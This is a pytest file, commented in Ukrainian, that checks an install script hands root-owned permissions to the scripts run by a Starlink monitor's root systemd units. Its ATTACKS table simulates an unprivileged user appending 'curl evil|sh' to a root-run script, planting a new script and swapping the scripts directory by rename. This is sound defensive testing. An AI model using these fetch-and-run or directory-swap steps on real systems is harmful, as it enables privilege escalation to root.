"""Власність root для того, що виконує root (scripts/install.sh, блок root-owned-scripts).

Юніти starlink-monitor-healthcheck і starlink-wan-failover працюють від root і щохвилини/кожні 30 с
запускають скрипти з /opt/starlink-monitor/scripts, а адміністратор запускає `sudo bash .../update.sh`.
Раніше `chown -R $RUN_USER` віддавав ці скрипти користувачу, під яким працюють веб-інтерфейс без
автентифікації, монітор і дисплей: будь-який збій там давав шлях до root (переписати скрипт і
почекати хвилину). Права на сам файл недостатні - власник батьківського каталогу підміняє каталог цілком.
"""
import os
import pwd
import re
import subprocess
import sys
import tempfile
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
INSTALL = (ROOT / "scripts" / "install.sh").read_text(encoding="utf-8")
SCRIPTS_PREFIX = "/opt/starlink-monitor/scripts/"


def _root_units():
    """Юніти без User= - вони працюють від root."""
    units = {}
    for path in sorted((ROOT / "systemd").glob("*.service")):
        text = path.read_text(encoding="utf-8")
        if not re.search(r"^User=", text, re.M):
            units[path.name] = re.search(r"^ExecStart=(\S+)", text, re.M).group(1)
    return units


def test_there_are_root_units_and_they_execute_only_scripts_from_the_guarded_directory():
    """Новий root-юніт, що виконує щось поза scripts/ (venv, app/), - привід для перегляду безпеки:
    ті каталоги лишаються за RUN_USER."""
    units = _root_units()
    assert units, "тест застарів: root-юнітів немає"
    for name, exe in units.items():
        assert exe.startswith(SCRIPTS_PREFIX), f"{name} виконує {exe} поза {SCRIPTS_PREFIX}"
        assert (ROOT / "scripts" / exe[len(SCRIPTS_PREFIX):]).is_file(), (name, exe)


def _block():
    match = re.search(r"# >>> root-owned-scripts\n(.*?)# <<< root-owned-scripts", INSTALL, re.S)
    assert match, "у install.sh немає блоку root-owned-scripts"
    return match.group(1)


def test_ownership_block_roots_the_project_dir_and_scripts():
    block = _block()
    assert 'chown root:root "$PROJECT_DIR"\n' in block                 # батьківський каталог: інакше scripts/ підміняється цілком
    assert 'chown -R root:root "$PROJECT_DIR/scripts"' in block
    assert 'chmod -R go-w "$PROJECT_DIR/scripts"' in block
    assert 'chmod 755 "$PROJECT_DIR"' in block


def test_ownership_block_comes_after_every_step_that_needs_the_user_to_write_the_project_dir():
    """venv і pip створюються від RUN_USER (sudo -u) у $PROJECT_DIR; root-власник раніше зламав би першу установку."""
    start = INSTALL.index("# >>> root-owned-scripts")
    assert INSTALL.rfind('sudo -u "$RUN_USER"') < start
    assert INSTALL.rfind('chown -R "$RUN_USER:$RUN_USER" "$PROJECT_DIR"') < start     # інакше блок був би перекритий


def _as_nobody():
    nobody = pwd.getpwnam("nobody")
    os.setgroups([])
    os.setgid(nobody.pw_gid)
    os.setuid(nobody.pw_uid)


def _attempt(code):
    """Чи вдається коду від імені nobody (True = вдалося)."""
    return subprocess.run([sys.executable, "-c", code], preexec_fn=_as_nobody, capture_output=True, timeout=30).returncode == 0


def _tree_owned_by_runuser():
    """Стан після `chown -R $RUN_USER:$RUN_USER "$PROJECT_DIR"` (RUN_USER тут = nobody)."""
    base = Path(tempfile.mkdtemp(prefix="own-", dir="/tmp"))
    base.chmod(0o755)
    project = base / "proj"
    (project / "scripts").mkdir(parents=True)
    (project / "app" / "vendor").mkdir(parents=True)
    (project / "venv").mkdir()
    script = project / "scripts" / "watchdog_healthcheck.sh"
    script.write_text("#!/usr/bin/env bash\necho ok\n", encoding="utf-8")
    script.chmod(0o755)
    nobody = pwd.getpwnam("nobody")
    subprocess.run(["chown", "-R", f"{nobody.pw_uid}:{nobody.pw_gid}", str(project)], check=True)
    return project


def _apply_block(project):
    subprocess.run(["bash", "-c", f'set -euo pipefail\nPROJECT_DIR="{project}"\n{_block()}'], check=True, capture_output=True)


ATTACKS = {
    "дописати у скрипт": "open('{p}/scripts/watchdog_healthcheck.sh', 'a').write('curl evil|sh')",
    "додати новий файл у scripts/": "open('{p}/scripts/evil.sh', 'w').write('x')",
    "підмінити scripts/ цілком (rename у батьківському каталозі)": "import os; os.rename('{p}/scripts', '{p}/scripts.old'); os.mkdir('{p}/scripts')",
}


@pytest.mark.skipif(os.geteuid() != 0, reason="потрібен root (chown, setuid)")
@pytest.mark.parametrize("attack", list(ATTACKS))
def test_unprivileged_user_can_attack_before_the_block_and_cannot_after(attack):
    code = ATTACKS[attack]
    before = _tree_owned_by_runuser()
    assert _attempt(code.format(p=before)) is True, "контроль: до блоку атака має вдаватись (інакше тест нічого не доводить)"
    after = _tree_owned_by_runuser()
    _apply_block(after)
    assert _attempt(code.format(p=after)) is False, f"після блоку RUN_USER усе ще може: {attack}"


@pytest.mark.skipif(os.geteuid() != 0, reason="потрібен root (chown, setuid)")
def test_block_leaves_what_the_services_need_writable_for_the_user():
    """fetch-юніт (RUN_USER) оновлює app/vendor; venv - від RUN_USER; решта проєкту читається."""
    project = _tree_owned_by_runuser()
    _apply_block(project)
    assert _attempt(f"open('{project}/app/vendor/starlink_grpc.py', 'w').write('x')") is True
    assert _attempt(f"open('{project}/venv/marker', 'w').write('x')") is True
    assert _attempt(f"open('{project}/scripts/watchdog_healthcheck.sh').read()") is True          # читати можна
    assert _attempt(f"import os; os.execv('{project}/scripts/watchdog_healthcheck.sh', ['x'])") is True   # виконувати теж
    for path in (project, project / "scripts", project / "scripts" / "watchdog_healthcheck.sh"):
        assert os.stat(path).st_uid == 0, path
    assert (os.stat(project).st_mode & 0o022) == 0 and (os.stat(project / "scripts").st_mode & 0o022) == 0
